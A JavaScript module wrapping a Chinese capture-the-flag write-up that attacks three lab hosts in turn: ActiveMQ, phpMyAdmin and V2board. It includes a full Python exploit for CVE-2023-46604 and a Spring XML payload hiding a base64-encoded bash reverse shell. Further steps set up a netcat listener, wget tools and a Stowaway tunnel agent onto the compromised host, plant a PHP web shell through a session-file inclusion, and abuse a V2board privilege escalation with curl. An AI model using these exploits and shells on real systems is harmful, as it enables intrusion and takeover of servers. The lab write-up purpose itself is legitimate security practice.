const n="# 1-activeMQ\n\nhttp://10.1.5.252:5001 输入后弹出账密登录框，随便输入 admin 和 123456 抓包拦截\n\n![image-bfyG.png](/images/image-bfyG.png)\n\n表示 base64 编码后 admin:123456 于是爆破。账号为 admin 于是固定前缀为 admin: 且进行 base64 编码\n\n爆破后得到\n\n![image-vfwj.png](/images/image-vfwj.png)\n\n解码得到 admin:admin\n\n#### 信息收集\n\n输入 `ifconfig` 命令查 ip\n\n> 题目环境在协会内网（10.1） → 目标服务器大概率是 `10.0.101.x` 段。此时协会内网就是题目里的外网环境，攻击机的 ip，端口是我们从真实外网连入内\n\n![image-aKcS.png](/images/image-aKcS.png)\n\n| 接口 | IP | 说明 |\n|------|-----|------|\n| eth0 | 10.0.101.2 | 你在内网的IP（攻击机在协会内网中的地址）→ 后续做\"反弹Shell\"的回连地址 |\n| lo | 127.0.0.1 | 本地回环 |\n\n#### 漏洞利用\n\n搜 apache activemq cve 看见 CVE-2023-46604 poc\n\n#### 启动 http 服务\n\n```bash\n# 创建 /cve 目录（如果还没有）\nmkdir -p /cve\n\n# 进入该目录\ncd /cve\n\n# 创建 poc.xml\nvim poc.xml\n```\n\n将下面这段内容粘贴进去（这就是触发命令执行的核心配置）\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\">\n    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n        <constructor-arg>\n            <list>\n                <value>bash</value>\n                <value>-c</value>\n                <value>{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEwMS4yLzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}</value>\n            </list>\n        </constructor-arg>\n    </bean>\n</beans>\n```\n\n解码后为\n\n```bash\nbash -c 'bash -i >& /dev/tcp/10.0.101.2/2333 0>&1; cd /cve; python3 -m http.server 7777'\n```\n\n即：反弹 Shell 到 10.0.101.2:2333，并在目标机启动 HTTP 服务（7777 端口）用于后续传文件\n\n然后在 /cve 目录下，执行命令\n\n```bash\npython3 -m http.server 7777\n```\n\n#### 监听反弹 shell\n\n坐等目标服务器执行命令后，主动连接回来，使获得一个交互式的控制终端。\n\n因为上一步的 HTTP 服务占用了当前终端，所以在新的窗口执行监听命令\n\n```bash\nnc -lnvp 2333\n```\n\n#### 运行 poc 脚本（触发漏洞）\n\n向目标 ActiveMQ 服务器发送一个特制的恶意数据包，诱使它去下载并执行放在 HTTP 服务器上的 `poc.xml`。\n\n前面知道了漏洞编号，网上很多 java 的脚本，但是攻击机的环境里没有 java，只能用 python 打。\n\n```python\nimport io\nimport socket\nimport sys\n\n\ndef main(ip, port, xml):\n    classname = \"org.springframework.context.support.ClassPathXmlApplicationContext\"\n    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    socket_obj.connect((ip, port))\n\n    with socket_obj:\n        out = socket_obj.makefile('wb')\n        out.write(int(32).to_bytes(4, 'big'))\n        out.write(bytes([31]))\n        out.write(int(1).to_bytes(4, 'big'))\n        out.write(bool(True).to_bytes(1, 'big'))\n        out.write(int(1).to_bytes(4, 'big'))\n        out.write(bool(True).to_bytes(1, 'big'))\n        out.write(bool(True).to_bytes(1, 'big'))\n        out.write(len(classname).to_bytes(2, 'big'))\n        out.write(classname.encode('utf-8'))\n        out.write(bool(True).to_bytes(1, 'big'))\n        out.write(len(xml).to_bytes(2, 'big'))\n        out.write(xml.encode('utf-8'))\n        out.flush()\n        out.close()\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 4:\n        print(\"Please specify the target and port and poc.xml: python3 poc.py 127.0.0.1 61616 \"\n              \"http://192.168.0.101:8888/poc.xml\")\n        exit(-1)\n    main(sys.argv[1], int(sys.argv[2]), sys.argv[3])\n```\n\n（这里后面输入好像会出现格式错误，说是存在缩进问题？）\n\n用 `python` 自身修复，在 `/cve` 目录下，直接运行：\n\n```bash\n# 用 Python 一行命令修复缩进（100% 成功，无需任何额外包）\npython3 -c \"open('poc.py','w').write(open('poc.py','r',encoding='utf-8').read().replace('\\t','    '))\"\n\n# 验证，没有输出则修复正确\npython3 -m py_compile poc.py\n```\n\n```bash\ncd /cve\n\n# 创建 poc.py 脚本\nvim poc.py\n\n# 运行 poc 脚本\npython3 poc.py 10.1.5.252 50001 http://10.0.101.2:7777/poc.xml\n\n# 10.1.5.252: 这是目标 ActiveMQ 服务器的 IP 地址。\n# 50001: 这是目标 ActiveMQ 服务器 OpenWire 协议的端口号（通常是 61616，但题目环境可能改了）。\n# http://10.0.101.2:7777/poc.xml: 这是第一步启动的 HTTP 服务的完整 URL，指向恶意 poc.xml 文件\n```\n\n#### 反弹 shell\n\n连上后接下来懂得都懂了，看根目录，cat /flag 就好\n\n## 2-phpMyAdmin\n\n第一题应该是已经打入 activemq 内网了，接下进行下一步。\n\n拿下第一题 flag 后再执行\n\n```bash\nifconfig\n```\n\n可以看到我们现在是 10.0.101.3，而 127.0.0.1 是本地回环地址，172.30.101.2 则是内网 ip\n\n攻击机根目录下有个 fscan 工具，赛题 2、3 需要我们扫到内网对应的 port，可以联想到需要 fscan 来打 port，就需要把 fscan 从攻击机运到 1 号机（远程包含可以做到命令传东西）\n\n> 1号机 = 赛题1机，以此类推\n\n### 先在攻击机起 http 服务：\n\n```bash\npython3 -m http.server 6767\n```\n\n### 一号机使用 wget 来进行下来\n\n```bash\nwget http://10.0.101.2:6767/fscan\n```\n\n如果直接启服务器应该是不行的，攻击机目录在 /root 但是 fscan 这个工具在 / 下面，所以我们需要在攻击机的根目录下面起服务\n\n```bash\ncd /\nroot@c3f7e5968b78:/# python3 -m http.server 6767\n```\n\n### 下载好了之后可以使用 fscan 工具了\n\n直接使用会提示 permission denied 被告知没有权限，所以提权\n\n```bash\nchmod +777 fscan\n./fscan -h 172.30.101.2/24\n```\n\nx.x.x.1 不属于赛题环境，其在赛题文档里面说明是无用的，可以忽略\n\n.2 为一号机，即我们自己\n\n所以二号机三号机只能在后面找（还有个漏洞）\n\n### 接下来需要进行内网穿透\n\n问问 ai 搜 Stowaway 在 https://github.com/ph4ntonn/Stowaway/releases/tag/v2.2 需要下载两个文件：\n\n一个是 Stowaway 的管理端/控制端程序（运行在攻击者机器或跳板机上），用于配置隧道\n\n另一个是 Stowaway 的代理端/客户端程序（需上传到目标内网机器——即\"1号机\"上运行），负责实际转发流量\n\n#### 起 http，wget 移到一号机（文件需要权限，否则不能执行命令）\n\n文件拖过来了的是在攻击机上，但并没有在已经打进去的内网一号机里面，所以需要起一个 http 利用跳板让文件到一号机里面\n\n```bash\npython3 -m http.server 9999  # 攻击机（记得是在根目录下面起）\n\nwget http://10.0.101.2:9999/linux_x64_agent\n```\n\n#### 攻击机：\n\n结束前面起的那个 9999\n\n```bash\nchmod +x ./stowaway_admin\n./stowaway_admin -l 6666\n```\n\n#### 1号机（内网跳板机）：\n\n```bash\nchmod +x ./linux_x64_agent\n./linux_x64_agent -c 10.0.101.2:6666\n```\n\n#### 隧道打通：使用 SOCKS 代理访问内网\n\n![image-bOBc.png](/images/image-bOBc.png)\n\n```bash\nuse 0\nsocks 60001\n```\n\n#### 然后使用 proxifier:\n\n先点击菜单添加代理信息。\n\n然后再点击菜单添加规则。默认两个规则不要动，点击添加。可以添加多个规则，优先级为上面的优先。不同的应用名称用分号隔开，可以写完整路径也可以写 exe 的名称例如：chrome.exe;\n\n![image-UOyy.png](/images/image-UOyy.png)\n\n```sql\nselect '<?php echo shell_exec($_GET[\"cmd\"]); ?>';\n```\n\n这条语句会被记录到 phpmyadmin 的 session 文件里面，\n\n然后访问：\n\n```\nhttp://172.30.101.4/index.php?target=db_sql.php%253f/../../../../tmp/sess_[你的session_id]\n```\n\n```\nhttp://172.30.101.4/index.php?target=db_sql.php%253f/../../../../tmp/sess_819ac6d5dc5da097c2385f15f19ab1e1&cmd=cat /flag\n```\n\n![image-wMyi.png](/images/image-wMyi.png)\n\n## 3-v2board\n\n前面可以看到 `./fscan -h 172.30.101.2/24`\n\n![image-mucd.png](/images/image-mucd.png)\n\n![image-Xavw.png](/images/image-Xavw.png)\n\n做信息收集\n\n有个提权漏洞，`https://github.com/FlyPython/Vulhub-POC/blob/master/V2board%201.6.1%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.md`\n\n找个 cve 复现 V2board 是一个多用户代理工具管理面板。在其 1.6.1 版本中，引入了对于用户 Session 的缓存机制，服务器会将用户的认证信息储存在 Redis 缓存中。\n\n但由于读取缓存时没有校验该用户是普通用户还是管理员，导致普通用户的认证信息即可访问管理员接口，造成提权漏洞。\n\n**先要注册一个账号**，然后使用攻击机发送这个请求：\n\n```bash\ncurl -i -s -k -XPOST --data-binary \"email=example%40example.com&password=a123123123\" http://localhost:8080/api/v1/passport/auth/login\n```\n\n（根据自己情况进行修改）\n\n```bash\ncurl -v -m 10 -X POST \\\n    -H \"Content-Type: application/json\" \\\n    -d '{\"email\":\"a@a.com\",\"password\":\"123456789\"}' \\\n    http://172.30.101.3/api/v1/passport/auth/register\n```\n\n发送成功之后会返回当前用户认证信息，发现 auth_data 变了：`YUBhLmNvbTokMnkkMTAkWk03WTB0ZjhtRG9GdjVWYWVxVzlrdTFKMXVXeE92UXU1U3R5aEh3N3EwL3FTM0c1NEZjbGE=`\n\n带上这个 Authorization 头即可访问所有的管理员接口\n\n`/api/v1/admin/user/fetch` 可以读到包括 admin 在内的所有成员信息\n\n就可以找到邮箱了\n";export{n as default};
